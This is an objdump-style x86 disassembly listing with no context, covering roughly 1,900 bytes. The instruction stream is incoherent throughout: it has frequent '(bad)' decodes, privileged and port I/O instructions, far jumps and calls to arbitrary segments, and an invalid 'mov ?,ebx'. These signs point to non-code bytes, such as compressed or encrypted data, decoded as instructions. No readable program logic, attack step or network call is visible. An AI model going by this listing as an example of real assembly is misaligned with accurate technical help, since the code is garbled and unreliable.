  41fee4:	inc    eax
  41fee5:	ins    DWORD PTR es:[edi],dx
  41fee6:	sbb    al,0x5d
  41fee8:	outs   dx,BYTE PTR ds:[esi]
  41fee9:	ins    DWORD PTR es:[edi],dx
  41feea:	push   0xffffffb4
  41feec:	inc    ecx
  41feed:	rcl    DWORD PTR [ebx+0x2ba82fed],cl
  41fef3:	xchg   esi,eax
  41fef4:	jp     0x41ff0d
  41fef6:	dec    edi
  41fef7:	fbstp  TBYTE PTR [eax+0x7c]
  41fefa:	xchg   edi,eax
  41fefb:	and    ch,BYTE PTR [esi]
  41fefd:	or     al,0x71
  41feff:	fisttp DWORD PTR [ecx+0x38]
  41ff02:	mov    bl,0x3e
  41ff04:	push   eax
  41ff05:	mov    esp,0x97c2ce3e
  41ff0a:	pusha  
  41ff0b:	out    dx,al
  41ff0c:	mov    ebx,0x3f4e718
  41ff11:	inc    eax
  41ff12:	shl    DWORD PTR [eax],cl
  41ff14:	xchg   DWORD PTR [edi-0x28],esi
  41ff17:	jns    0x41ff42
  41ff19:	mov    cl,0x1c
  41ff1b:	(bad)  
  41ff1c:	sar    BYTE PTR [edi+0x45f5ce67],cl
  41ff22:	pop    ss
  41ff23:	mov    ch,0x9b
  41ff25:	mov    ch,0x1d
  41ff27:	sub    BYTE PTR [edx],cl
  41ff29:	inc    eax
  41ff2a:	push   ds
  41ff2b:	sahf   
  41ff2c:	xor    ch,ch
  41ff2e:	daa    
  41ff2f:	cli    
  41ff30:	push   eax
  41ff31:	cdq    
  41ff32:	or     bh,BYTE PTR [esi]
  41ff34:	cli    
  41ff35:	(bad)  
  41ff36:	sbb    esi,DWORD PTR [esi]
  41ff38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ff39:	lds    esp,FWORD PTR [eax]
  41ff3b:	mov    DWORD PTR [edx+0x4b8a0e42],ecx
  41ff41:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff43:	ret    0x6f85
  41ff46:	xchg   esp,eax
  41ff47:	xor    ah,BYTE PTR [ecx+0x3c]
  41ff4a:	aas    
  41ff4b:	jb     0x41fed1
  41ff4d:	stos   BYTE PTR es:[edi],al
  41ff4e:	pushf  
  41ff4f:	bound  ebx,QWORD PTR [esp+esi*1]
  41ff52:	dec    esi
  41ff53:	add    al,0xe2
  41ff55:	or     ebx,esp
  41ff57:	mov    al,0xc0
  41ff59:	sub    dl,BYTE PTR [ecx-0x5f]
  41ff5c:	je     0x41ff9a
  41ff5e:	jae    0x41ffb3
  41ff60:	dec    ebp
  41ff61:	sbb    al,0x5
  41ff63:	sbb    ch,bl
  41ff65:	ds jmp 0x457c:0xf3bdec8f
  41ff6d:	iret   
  41ff6e:	mov    eax,ds:0x5683d175
  41ff73:	ja     0x41ff9f
  41ff75:	mov    ebx,edi
  41ff77:	mov    edi,ss
  41ff79:	cdq    
  41ff7a:	adc    esp,DWORD PTR [eax+0x49a02138]
  41ff80:	(bad)  
  41ff81:	mov    edi,DWORD PTR [ecx+edi*8]
  41ff84:	cmp    BYTE PTR [ecx+0x7572ee1e],ch
  41ff8a:	or     DWORD PTR [esi-0x4c8cb19b],edi
  41ff90:	pop    eax
  41ff91:	data16 shl BYTE PTR [esi+0x6a],0xd0
  41ff96:	add    al,0x76
  41ff98:	sub    edx,esi
  41ff9a:	jmp    0x3a6:0x539495de
  41ffa1:	mov    ecx,edx
  41ffa3:	add    ah,BYTE PTR [edi]
  41ffa5:	fldln2 
  41ffa7:	xor    eax,0x8cb40411
  41ffac:	pop    edi
  41ffad:	ret    0xd96d
  41ffb0:	xchg   DWORD PTR [ebp-0x7e],ecx
  41ffb3:	sar    bl,1
  41ffb5:	xchg   DWORD PTR [ebx+0x2742781d],edi
  41ffbb:	push   esp
  41ffbc:	pusha  
  41ffbd:	(bad)  
  41ffbe:	pop    ebp
  41ffbf:	enter  0x432,0x7b
  41ffc3:	push   ecx
  41ffc4:	notrack jmp DWORD PTR [ebx+0x10d893fe]
  41ffcb:	(bad)  
  41ffcc:	ins    DWORD PTR es:[edi],dx
  41ffcd:	or     esp,esp
  41ffcf:	sbb    eax,0xbbeec03
  41ffd4:	sbb    al,0xbb
  41ffd6:	sti    
  41ffd7:	cmp    BYTE PTR [ebx+0x52],bh
  41ffda:	test   DWORD PTR [edi],esp
  41ffdc:	popf   
  41ffdd:	push   DWORD PTR [ebx+0x5697e81f]
  41ffe3:	jno    0x41ff99
  41ffe5:	and    DWORD PTR [ebp+0x84bb506],ecx
  41ffeb:	adc    DWORD PTR [eax-0x7a],edi
  41ffee:	in     al,0xf
  41fff0:	push   ebp
  41fff1:	in     eax,dx
  41fff2:	hlt    
  41fff3:	cli    
  41fff4:	and    DWORD PTR [eax],ecx
  41fff6:	scas   eax,DWORD PTR es:[edi]
  41fff7:	inc    esi
  41fff8:	jae    0x41ffbe
  41fffa:	js     0x42004e
  41fffc:	or     eax,0xd811bcd7
  420001:	sbb    DWORD PTR [edi],0xe832e0f3
  420007:	jp     0x420066
  420009:	lods   eax,DWORD PTR ds:[esi]
  42000a:	stos   DWORD PTR es:[edi],eax
  42000b:	mov    ecx,0x600e15b7
  420010:	inc    ecx
  420011:	leave  
  420012:	in     eax,dx
  420013:	pushf  
  420014:	push   esp
  420015:	ret    0x5764
  420018:	sbb    DWORD PTR [edx],edi
  42001a:	xor    DWORD PTR [eax+ebx*1-0x5b],edx
  42001e:	in     eax,0xa7
  420020:	jp     0x420010
  420022:	ja     0x41ffc2
  420024:	and    dl,BYTE PTR [esi-0x1c]
  420027:	hlt    
  420028:	bnd jbe 0x41ffe7
  42002b:	mov    cl,0x23
  42002d:	rcr    DWORD PTR [edx-0x7],1
  420030:	add    eax,0xeac72524
  420035:	int3   
  420036:	fimul  WORD PTR cs:[edx-0x21bef0d1]
  42003d:	adc    DWORD PTR [ecx+0x22489d2d],ebx
  420043:	add    edi,ecx
  420045:	pop    edi
  420046:	dec    ebx
  420047:	test   eax,0x60ca1f85
  42004c:	or     dl,BYTE PTR [ebp-0x7779551f]
  420052:	xchg   ecx,eax
  420053:	mov    dl,0x61
  420055:	xor    eax,0xaeb0acc2
  42005a:	xchg   eax,esp
  42005c:	xchg   ebx,eax
  42005d:	(bad)  
  42005e:	fmul   DWORD PTR [ecx+eiz*2+0x5afff27c]
  420065:	lds    edi,FWORD PTR [eax+0xf537bbe]
  42006b:	ds push 0xafc5b7c7
  420071:	sbb    eax,0x8de62af6
  420076:	shl    DWORD PTR [ebx+ebx*8+0x290e051a],0xf2
  42007e:	cmp    al,0xd
  420080:	mov    ch,0x78
  420082:	fldz   
  420084:	jo     0x4200af
  420086:	xor    BYTE PTR [eax+0x4e92bdf6],al
  42008c:	push   0xffffffda
  42008e:	dec    esp
  42008f:	jmp    0xa508:0xa183ca03
  420096:	and    al,0xaf
  420098:	int3   
  420099:	scas   al,BYTE PTR es:[edi]
  42009a:	and    esp,edi
  42009c:	mov    ecx,0xdf46d837
  4200a1:	xchg   ebx,eax
  4200a2:	push   ebx
  4200a3:	fwait
  4200a4:	lods   eax,DWORD PTR ds:[esi]
  4200a5:	dec    esi
  4200a6:	test   DWORD PTR [eax],eax
  4200a8:	and    DWORD PTR [edx],esi
  4200aa:	mov    al,0xde
  4200ac:	cli    
  4200ad:	mov    DWORD PTR [ebx+ebx*2-0x2a4de09],0xb5cc4588
  4200b8:	mov    dl,BYTE PTR [esi-0x11]
  4200bb:	cmp    al,0x18
  4200bd:	push   ebp
  4200be:	shl    BYTE PTR [ebp-0x29],cl
  4200c1:	in     al,dx
  4200c2:	push   ebp
  4200c3:	inc    edi
  4200c4:	and    DWORD PTR [eax],edi
  4200c6:	sar    ah,0xe4
  4200c9:	adc    eax,0xe6b408de
  4200ce:	add    DWORD PTR [ebx],edi
  4200d0:	jmp    0xa78d:0x5af9c640
  4200d7:	nop
  4200d8:	gs out 0x1c,al
  4200db:	inc    ebp
  4200dc:	ins    DWORD PTR es:[edi],dx
  4200dd:	stc    
  4200de:	leave  
  4200df:	mov    bh,BYTE PTR [ecx]
  4200e1:	ds gs xchg esp,eax
  4200e4:	sbb    al,0xcd
  4200e6:	icebp  
  4200e7:	mov    ecx,DWORD PTR [eax-0x3eeda211]
  4200ed:	fidiv  WORD PTR [ebx+0x7fce886e]
  4200f3:	jmp    FWORD PTR [edx]
  4200f5:	or     al,0xcb
  4200f7:	jnp    0x4200d3
  4200f9:	out    0xb,al
  4200fb:	nop
  4200fc:	hlt    
  4200fd:	std    
  4200fe:	push   ebp
  4200ff:	xlat   BYTE PTR es:[ebx]
  420101:	retf   
  420102:	cmp    DWORD PTR [ebx+0x1caabb2c],esp
  420108:	div    BYTE PTR [esi+0x2c95ae60]
  42010e:	loopne 0x420189
  420110:	jg     0x420122
  420112:	mov    bl,0x26
  420114:	cmp    BYTE PTR [eax],bl
  420116:	mov    bh,0xb
  420118:	xlat   BYTE PTR ds:[ebx]
  420119:	jle    0x4200f9
  42011b:	std    
  42011c:	jl     0x4200d7
  42011e:	add    DWORD PTR [edx],0xa8bf2f27
  420124:	adc    eax,0x8e87351b
  420129:	sbb    DWORD PTR [eax-0x49],ebx
  42012c:	test   BYTE PTR [esi],bh
  42012e:	mov    cl,0x40
  420130:	je     0x420160
  420132:	in     eax,dx
  420133:	push   0xfa5be69b
  420138:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420139:	adc    edi,esp
  42013b:	xchg   ebp,eax
  42013c:	adc    ecx,DWORD PTR [eax]
  42013e:	xor    ebx,ebp
  420140:	aaa    
  420141:	xchg   esi,eax
  420142:	jnp    0x4200d9
  420144:	pop    esp
  420145:	retf   0x1c60
  420148:	test   eax,0x399e9029
  42014d:	fidiv  WORD PTR [esi-0x7f]
  420151:	idiv   bl
  420153:	add    ecx,DWORD PTR [ebp+0x7a]
  420156:	repz add eax,DWORD PTR [ebx+0x3b]
  42015a:	stc    
  42015b:	push   edi
  42015c:	push   0x2b
  42015e:	dec    eax
  42015f:	mov    WORD PTR [eax-0x3a],fs
  420162:	pop    es
  420163:	mov    ds:0xca934e8b,al
  420168:	xor    esp,esi
  42016a:	test   esi,0xf9a50413
  420170:	or     eax,0xa2f00ac2
  420175:	and    BYTE PTR gs:[eax-0x18d812e8],bl
  42017c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42017d:	adc    BYTE PTR [edi],al
  42017f:	fsubr  DWORD PTR [edi-0x3b]
  420182:	stos   DWORD PTR es:[edi],eax
  420183:	adc    ebx,DWORD PTR [edi]
  420185:	js     0x42014f
  420187:	xchg   edx,eax
  420188:	and    esi,esp
  42018a:	mov    ds:0x4002e395,eax
  42018f:	cld    
  420190:	pop    ebp
  420191:	and    al,0xd1
  420193:	inc    esp
  420194:	xor    BYTE PTR [ebx+ecx*1+0x37],cl
  420198:	xor    ecx,edx
  42019a:	je     0x4201be
  42019c:	inc    ebp
  42019d:	or     DWORD PTR [edi-0xe],eax
  4201a0:	pop    esi
  4201a1:	mov    al,BYTE PTR [edx]
  4201a3:	or     BYTE PTR [ecx],dl
  4201a5:	out    0x7c,al
  4201a7:	sub    al,0xe4
  4201a9:	(bad)
  4201ac:	fiadd  DWORD PTR [esi+0x54]
  4201af:	pop    ecx
  4201b0:	inc    edi
  4201b1:	mov    ds:0xd2f96c33,eax
  4201b6:	lods   al,BYTE PTR ds:[esi]
  4201b7:	es push ds
  4201b9:	push   esi
  4201ba:	and    cl,BYTE PTR [ecx-0x6f]
  4201bd:	push   ebp
  4201be:	mov    ecx,0xd671d97f
  4201c3:	outs   dx,DWORD PTR ds:[esi]
  4201c4:	lahf   
  4201c5:	or     ch,bh
  4201c7:	(bad)  
  4201c8:	sar    BYTE PTR ds:0x4a76c0e6,1
  4201ce:	in     al,0x9a
  4201d0:	aas    
  4201d1:	cld    
  4201d2:	hlt    
  4201d3:	xchg   DWORD PTR [ebx],ebp
  4201d5:	inc    edi
  4201d6:	call   0xe66e:0x13efb15f
  4201dd:	sub    DWORD PTR [edx+0x3e2e013c],esi
  4201e3:	rol    cl,cl
  4201e5:	(bad)  
  4201e6:	sti    
  4201e7:	es repz retf 0x98f
  4201ec:	dec    ecx
  4201ed:	push   esi
  4201ee:	cwde   
  4201ef:	(bad)  
  4201f0:	lods   al,BYTE PTR ds:[esi]
  4201f1:	stos   BYTE PTR es:[edi],al
  4201f2:	jns    0x42020c
  4201f4:	lods   al,BYTE PTR ds:[esi]
  4201f5:	cmp    bh,dh
  4201f7:	and    edx,DWORD PTR [ebp-0x43a8afe4]
  4201fd:	inc    ebx
  4201fe:	scas   al,BYTE PTR es:[edi]
  4201ff:	and    al,0xcc
  420201:	ins    DWORD PTR es:[edi],dx
  420202:	stos   DWORD PTR es:[edi],eax
  420203:	repnz push cs
  420205:	inc    edi
  420206:	lea    edi,[eax-0x25]
  420209:	mov    ah,0x5c
  42020b:	sub    dh,BYTE PTR [esi-0x2da66f1b]
  420211:	pop    eax
  420212:	inc    edi
  420213:	dec    eax
  420214:	mov    WORD PTR [ecx+0x5e],ss
  420217:	mov    ch,0x78
  420219:	mov    bl,0x39
  42021b:	and    ah,BYTE PTR [esi+0x27]
  42021e:	mov    eax,DWORD PTR [eax-0x76c66205]
  420224:	leave  
  420225:	dec    eax
  420226:	push   cs
  420227:	inc    esp
  420228:	inc    edi
  420229:	aas    
  42022a:	mov    eax,0xbb3b35c1
  42022f:	pop    ebx
  420230:	xchg   esp,eax
  420231:	mov    al,ds:0xcabe6de5
  420236:	jle    0x420202
  420238:	repnz mov ecx,0xb09ee472
  42023e:	adc    ecx,DWORD PTR [esi-0x157d750a]
  420244:	call   0x6412:0xfdb769e6
  42024b:	sub    bh,BYTE PTR [edi-0x1332967c]
  420251:	fistp  WORD PTR [ecx]
  420253:	mov    al,ds:0x8f95705c
  420258:	inc    esp
  420259:	pop    edx
  42025a:	retf   0xf932
  42025d:	cmp    DWORD PTR [esi-0x7b],0xb
  420261:	mov    al,0xb8
  420263:	dec    eax
  420264:	xor    BYTE PTR [ebp-0xa],ah
  420267:	cmp    eax,0x526f17d8
  42026c:	add    al,0x96
  42026e:	mov    dl,0xd3
  420270:	jl     0x420287
  420272:	ins    DWORD PTR es:[edi],dx
  420273:	mov    dl,0x27
  420275:	je     0x42023d
  420277:	les    ecx,FWORD PTR [esi-0x43a92140]
  42027d:	pop    ebp
  42027e:	fcmove st,st(3)
  420280:	inc    esp
  420281:	mov    ebx,0x3d45eb7
  420286:	fwait
  420287:	(bad)  
  420288:	dec    ebx
  420289:	retf   0x9129
  42028c:	xor    DWORD PTR [edi],0x302ffa9b
  420292:	dec    esp
  420293:	mov    eax,ds:0x63a4969c
  420298:	jl     0x4202ac
  42029a:	(bad)  
  42029b:	adc    BYTE PTR [esi+edx*2-0x66],ch
  42029f:	adc    BYTE PTR [ebp+0x4a575d92],ah
  4202a5:	xor    ebx,DWORD PTR [ebx]
  4202a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202a8:	inc    ebp
  4202a9:	in     al,0x73
  4202ab:	cwde   
  4202ac:	jge    0x420290
  4202ae:	cli    
  4202af:	mov    DWORD PTR [esi],edx
  4202b1:	(bad)  
  4202b2:	fdivr  DWORD PTR ds:0x169d3921
  4202b8:	push   edi
  4202b9:	jbe    0x420278
  4202bb:	sti    
  4202bc:	and    eax,0x48ab2fb3
  4202c1:	dec    esi
  4202c2:	or     esp,DWORD PTR [eax]
  4202c4:	mov    bl,BYTE PTR [ebp-0xc361b0e]
  4202ca:	push   esi
  4202cb:	push   es
  4202cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4202cd:	je     0x420328
  4202cf:	dec    ebx
  4202d0:	into   
  4202d1:	jnp    0x42031e
  4202d3:	dec    esp
  4202d4:	push   ds
  4202d5:	dec    esp
  4202d6:	push   edx
  4202d7:	lods   eax,DWORD PTR ds:[esi]
  4202d8:	ja     0x420288
  4202da:	(bad)  
  4202dc:	fst    DWORD PTR [eax+0x42f87b10]
  4202e2:	add    eax,0xcae19e77
  4202e7:	jae    0x4202e2
  4202e9:	pop    edx
  4202ea:	mov    cl,0x68
  4202ec:	arpl   WORD PTR [edi+ebx*4+0x74],dx
  4202f0:	cmp    ch,ah
  4202f2:	daa    
  4202f3:	pop    edx
  4202f4:	clc    
  4202f5:	into   
  4202f6:	inc    ebx
  4202f7:	ficom  DWORD PTR [ebp+eiz*4-0x7af188ff]
  4202fe:	push   esp
  4202ff:	mov    esp,0x9baaa49a
  420304:	mov    ebp,0xa6e0c2b3
  420309:	loopne 0x420381
  42030b:	mov    ch,0x56
  42030d:	call   0x3195:0xfc7a87b6
  420314:	push   ss
  420315:	push   ebp
  420316:	hlt    
  420317:	xchg   ebx,eax
  420318:	and    ebx,ebp
  42031a:	lahf   
  42031b:	cs jo  0x420335
  42031e:	jmp    0x420363
  420320:	lea    esp,[eax+ebp*2+0x11b2e7b7]
  420327:	or     al,BYTE PTR [edi-0x3be3434b]
  42032d:	outs   dx,DWORD PTR ds:[esi]
  42032e:	mov    ebp,0xacf8ae95
  420333:	add    dl,BYTE PTR [ecx+eiz*4-0xa]
  420337:	mov    WORD PTR [ebx-0xde954bc],fs
  42033d:	shl    DWORD PTR [edx-0x6c450756],cl
  420343:	call   0xf5da:0x7cd0b1ef
  42034a:	dec    eax
  42034b:	sub    BYTE PTR [ecx+0x9],dh
  42034e:	sti    
  42034f:	mov    BYTE PTR [edi+0x5e],dh
  420352:	adc    al,0xc7
  420354:	mov    bh,0x1a
  420356:	pop    esi
  420357:	sbb    eax,0x2ca31714
  42035c:	xor    al,BYTE PTR [ebp+0x62720209]
  420362:	ret    0xd8d9
  420365:	mov    cl,dl
  420367:	push   cs
  420368:	mov    edi,0xda225538
  42036d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42036e:	push   esi
  42036f:	fwait
  420370:	push   edi
  420371:	push   cs
  420372:	mov    esp,0xe0e0f15f
  420377:	jo     0x42036a
  420379:	aad    0x99
  42037b:	std    
  42037c:	pushf  
  42037d:	jmp    0x42031e
  42037f:	mov    bl,0x7f
  420381:	pop    ss
  420382:	mov    bh,0x3c
  420384:	mov    ebx,0x47ccc50d
  420389:	stos   BYTE PTR es:[edi],al
  42038a:	cmc    
  42038b:	pop    edx
  42038c:	xsavec [eax]
  42038f:	loopne 0x4203b2
  420391:	mov    cl,0xa1
  420393:	shl    BYTE PTR [esi-0x359d1688],1
  420399:	push   0x30e20404
  42039e:	sub    al,0x2e
  4203a0:	call   0x14be6d60
  4203a5:	aaa    
  4203a6:	out    0xab,al
  4203a8:	add    ch,BYTE PTR [edx+0x47bab68d]
  4203ae:	jae    0x42033d
  4203b0:	cwde   
  4203b1:	leave  
  4203b2:	daa    
  4203b3:	imul   ecx,DWORD PTR [ebx-0x241aae83],0x52
  4203ba:	test   DWORD PTR [ecx+eiz*4+0x348829a9],eax
  4203c1:	call   DWORD PTR [edi+0x8463d5c]
  4203c7:	mov    edx,0xfe47377e
  4203cc:	sti    
  4203cd:	cmp    eax,0x791e4740
  4203d2:	jmp    0x4203cb
  4203d4:	rcr    DWORD PTR [eax-0x737594fc],1
  4203da:	add    al,0xf8
  4203dc:	push   edx
  4203dd:	lahf   
  4203de:	repnz pop esi
  4203e0:	pop    esp
  4203e1:	into   
  4203e2:	inc    edi
  4203e3:	or     DWORD PTR [edi-0xa6c5270],edx
  4203e9:	std    
  4203ea:	sub    ebp,0x49
  4203ed:	pop    es
  4203ee:	adc    DWORD PTR gs:[eax+0x1fe30cc7],ebp
  4203f5:	shr    DWORD PTR [ebx],cl
  4203f7:	pop    esi
  4203f8:	scas   al,BYTE PTR es:[edi]
  4203f9:	mov    edi,0x5db79e6f
  4203fe:	in     al,0xfa
  420400:	add    BYTE PTR [esi+0x570794e3],bl
  420406:	mov    al,ds:0x373ce00f
  42040b:	pop    eax
  42040c:	shr    BYTE PTR ds:0x43003f8f,cl
  420412:	xchg   ebp,eax
  420413:	repnz pop edx
  420415:	push   esp
  420416:	mov    ?,ebx
  420418:	push   esp
  420419:	xlat   BYTE PTR ds:[ebx]
  42041a:	push   eax
  42041b:	fwait
  42041c:	jne    0x4203b0
  42041e:	mov    WORD PTR [eax],ss
  420420:	mov    ds:0x98472885,eax
  420425:	lds    edi,FWORD PTR [esi+edi*4+0x534bdcb4]
  42042c:	rol    BYTE PTR [ebp-0x341d9e],1
  420432:	jecxz  0x420494
  420434:	sbb    eax,0xa4156f2c
  420439:	mov    edi,DWORD PTR [ebx+0x23]
  42043c:	cmp    al,0x5c
  42043e:	or     BYTE PTR [edx+0x63],dl
  420441:	jnp    0x420457
  420443:	repz add eax,0xd6627f0f
  420449:	xchg   esp,eax
  42044a:	icebp  
  42044b:	and    BYTE PTR [esi+0xe],dl
  42044e:	push   cs
  42044f:	imul   ebp,DWORD PTR [ebx-0x3f9a10e0],0x50d5b2ae
  420459:	test   BYTE PTR [edx-0x25],bh
  42045c:	inc    esp
  42045d:	addr16 es aas 
  420460:	mov    ah,0xe7
  420462:	dec    ecx
  420463:	shl    eax,1
  420465:	push   ecx
  420466:	lods   al,BYTE PTR ds:[esi]
  420467:	in     eax,0xf
  420469:	adc    ah,dh
  42046b:	fidivr DWORD PTR [ecx-0x4d]
  42046e:	pop    ss
  42046f:	jo     0x420474
  420471:	aaa    
  420472:	ret    
  420473:	push   0x264397c2
  420478:	(bad)  
  420479:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42047a:	push   0xab0aaf0a
  42047f:	(bad)
  420482:	cmp    al,0x90
  420484:	mov    ch,0x5b
  420486:	nop
  420487:	xchg   esi,ebx
  420489:	inc    edx
  42048a:	int    0xf1
  42048c:	sub    ebp,DWORD PTR ds:0xf13366ac
  420492:	add    al,0x7d
  420494:	bound  esp,QWORD PTR [ebx-0x87486f]
  42049a:	xchg   edx,eax
  42049b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42049c:	rol    ah,cl
  42049e:	outs   dx,DWORD PTR ds:[esi]
  42049f:	arpl   WORD PTR [ecx],bp
  4204a1:	jge    0x420481
  4204a3:	and    bh,BYTE PTR [edx-0x68]
  4204a6:	sbb    al,0xc4
  4204a8:	jl     0x42045c
  4204aa:	cli    
  4204ab:	sbb    BYTE PTR [ecx-0x79],ah
  4204ae:	and    al,0xcd
  4204b0:	jns    0x420509
  4204b2:	push   DWORD PTR [edi-0x6d777ac3]
  4204b8:	in     al,dx
  4204b9:	jle    0x42050e
  4204bb:	ret    
  4204bc:	fwait
  4204bd:	jb     0x42052e
  4204bf:	sub    bh,ch
  4204c1:	xlat   BYTE PTR ds:[ebx]
  4204c2:	les    esi,FWORD PTR [esi+0x3c]
  4204c5:	mov    ds:0xb8ed8225,al
  4204ca:	xchg   esp,eax
  4204cb:	call   DWORD PTR [ebx-0x26]
  4204ce:	sub    DWORD PTR [eax],edx
  4204d0:	test   al,0x9a
  4204d2:	pop    ebp
  4204d3:	int3   
  4204d4:	lods   al,BYTE PTR ds:[esi]
  4204d5:	add    bh,BYTE PTR [ebx]
  4204d7:	stc    
  4204d8:	or     eax,0x49f3fae0
  4204dd:	push   ecx
  4204de:	pop    esp
  4204df:	dec    DWORD PTR [edi-0x44c8b34]
  4204e5:	lds    eax,FWORD PTR [edi+0x79]
  4204e8:	add    ebp,DWORD PTR [edx+0x7]
  4204eb:	push   esp
  4204ec:	popa   
  4204ed:	dec    ebp
  4204ee:	ins    BYTE PTR es:[edi],dx
  4204ef:	addr16 inc ecx
  4204f1:	aad    0xf
  4204f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204f4:	ret    0x991e
  4204f7:	push   ebx
  4204f8:	rol    dl,1
  4204fa:	fstp   DWORD PTR [esi+0x66]
  4204fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4204fe:	sahf   
  4204ff:	into   
  420500:	dec    ebx
  420502:	add    ebp,DWORD PTR [ecx+eiz*1+0xc]
  420506:	in     eax,dx
  420507:	pop    ss
  420508:	stc    
  420509:	xlat   BYTE PTR ds:[ebx]
  42050a:	mov    eax,ds:0x520eccce
  42050f:	je     0x42058b
  420511:	push   esp
  420512:	cmp    bl,al
  420514:	jnp    0x4204d2
  420516:	cmp    BYTE PTR [ebx-0x35],dl
  420519:	push   0x67
  42051b:	leave  
  42051c:	add    DWORD PTR ds:0x608ecdd,edi
  420522:	inc    ebp
  420523:	sbb    eax,0xbe99501a
  420528:	push   ecx
  420529:	add    bh,0xf0
  42052c:	leave  
  42052d:	clc    
  42052e:	pop    es
  42052f:	dec    esp
  420530:	jno    0x420500
  420532:	sub    dh,BYTE PTR ds:0xac78dc79
  420538:	lahf   
  420539:	jg     0x420525
  42053b:	or     esp,DWORD PTR [edx+eax*1]
  42053e:	sub    al,BYTE PTR [eax+0x4e]
  420541:	inc    esp
  420542:	hlt    
  420543:	dec    edi
  420544:	mov    dh,BYTE PTR [esi+0x78bf8c8c]
  42054a:	jmp    0x9d3:0x5f7ab9af
  420551:	int3   
  420552:	push   ebx
  420553:	mov    dl,0x7a
  420555:	iret   
  420556:	mov    dh,0x28
  420558:	pusha  
  420559:	adc    ch,BYTE PTR [edi]
  42055b:	out    dx,eax
  42055c:	xchg   esp,eax
  42055d:	xor    BYTE PTR [edi-0x3b],al
  420560:	sar    BYTE PTR [ebx-0x4705f771],1
  420566:	out    dx,al
  420567:	(bad)  
  420568:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420569:	pushf  
  42056a:	or     edi,ebx
  42056c:	mov    dh,0x89
  42056e:	jns    0x4205ec
  420570:	stos   BYTE PTR es:[edi],al
  420571:	jnp    0x4205d1
  420573:	aas    
  420574:	add    BYTE PTR [ecx],ah
  420576:	stos   BYTE PTR es:[edi],al
  420577:	pop    edx
  420578:	jp     0x420585
  42057a:	sbb    eax,0x66c089fc
  42057f:	adc    eax,edi
  420581:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420583:	jg     0x4205da
  420585:	add    esi,0xffffffe1
  420588:	push   ebp
  420589:	loopne 0x4205eb
  42058b:	cdq    
  42058c:	inc    edx
  42058d:	jmp    0x24f8:0x66fe88f6
  420594:	mov    bh,0xd6
  420596:	arpl   WORD PTR [edx+0x10],bp
  420599:	cwde   
  42059a:	add    al,0x38
  42059c:	mov    ah,0xef
  42059e:	fwait
  42059f:	stos   DWORD PTR es:[edi],eax
  4205a0:	add    eax,0x4c2e74b5
  4205a5:	push   ds
  4205a6:	int    0xee
  4205a8:	push   ds
  4205a9:	sub    dh,dh
  4205ab:	pop    esi
  4205ac:	inc    ebp
  4205ad:	test   al,0x8a
  4205af:	ds dec ebp
  4205b1:	xlat   BYTE PTR ds:[ebx]
  4205b2:	mov    bh,0xfd
  4205b4:	and    bl,BYTE PTR [ebp-0x10]
  4205b7:	test   al,al
  4205b9:	cld    
  4205ba:	sbb    esi,DWORD PTR [esi+0x76602426]
  4205c0:	shr    BYTE PTR [edi-0x9a61237],cl
  4205c6:	lea    edx,es:[eax+0x57]
  4205ca:	inc    edi
  4205cb:	outs   dx,DWORD PTR ds:[esi]
  4205cc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4205cd:	jae    0x4205da
  4205cf:	jnp    0x420573
  4205d1:	lods   eax,DWORD PTR ds:[esi]
  4205d2:	pusha  
  4205d3:	and    DWORD PTR [ecx],ecx
  4205d5:	ret    0xec4c
  4205d8:	sub    DWORD PTR [ecx-0x3e],edi
  4205db:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4205dc:	ins    DWORD PTR es:[edi],dx
  4205dd:	fisttp DWORD PTR [ecx]
  4205df:	repnz cmps DWORD PTR ss:[esi],DWORD PTR es:[edi]
  4205e2:	sub    al,cl
  4205e4:	lods   eax,DWORD PTR ds:[esi]
  4205e5:	int3   
  4205e6:	sbb    DWORD PTR [esi+edi*8],edi
  4205e9:	inc    ebx
  4205ea:	fld    DWORD PTR [ebx-0x75]
  4205ed:	mov    edx,0x652625b0
  4205f2:	daa    
  4205f3:	or     eax,0x2e91e6a
  4205f8:	ja     0x4205e8
  4205fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4205fb:	sub    bh,BYTE PTR [ecx-0x316f91f1]
  420601:	fucomp st(4)
  420603:	or     eax,0x2f5f4219
  420608:	or     DWORD PTR [ecx-0x36],eax
  42060b:	and    al,0xc3
  42060d:	in     eax,dx
  42060e:	retf   0xc0f3
  420611:	jle    0x4205a5
  420613:	out    dx,eax
  420614:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420615:	aam    0x52
  420617:	xor    BYTE PTR [edx-0x7b54df41],al
  42061d:	leave  
  42061e:	push   esp
  42061f:	sti    
  420620:	in     eax,dx
  420621:	sbb    ah,BYTE PTR [esi-0x5c]
  420624:	sbb    al,0x39
  420626:	pop    edx
  420627:	sar    DWORD PTR ds:[edx-0x25],0x58
  42062c:	fnstsw WORD PTR [edi-0x12]
  42062f:	cmc    
  420630:	scas   al,BYTE PTR es:[edi]
  420631:	loopne 0x420623
  420633:	push   ss
  420634:	(bad)  
  420635:	hlt    
  420636:	std    
  420637:	test   BYTE PTR [ebx],0xe2
  42063a:	out    0x5a,eax
  42063c:	fwait
  42063d:	test   eax,0x86edc36b
  420642:	test   BYTE PTR [edx],bh
  420644:	popf   
  420645:	or     BYTE PTR [ebx+0x67],bl
  420648:	(bad)  
  42064a:	dec    ecx
  42064b:	jp     0x4205e8
  42064d:	fiadd  WORD PTR [ebp+ebx*8-0x3a4b5b5]
  420654:	mov    ebp,0x82ca31a9
  420659:	popa   
  42065a:	call   0x14ee4ea0
  42065f:	jge    0x4206b3
  420661:	push   ecx
